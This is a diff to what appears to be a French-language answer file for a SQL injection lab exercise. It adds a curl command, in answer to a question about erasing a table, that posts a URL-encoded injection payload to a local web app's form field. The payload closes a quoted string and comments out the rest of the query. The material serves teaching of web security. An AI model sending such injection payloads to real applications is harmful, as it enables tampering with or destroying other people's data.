@@ -26,6 +26,10 @@ curl 'http://127.0.0.1:8080/' -H 'Connection: keep-alive' -H 'Cache-Control: max
 
 * Votre commande curl pour effacer la table
 
+```
+curl 'http://127.0.0.1:8080/' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://127.0.0.1:8080' -H 'Connection: keep-alive' -H 'Referer: http://127.0.0.1:8080/' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'chaine=%24%24argent%24%24%27%2C+%27hey%27%29+ # &submit=OK'
+```
+
 * Expliquez comment obtenir des informations sur une autre table
 
 ## Question 4
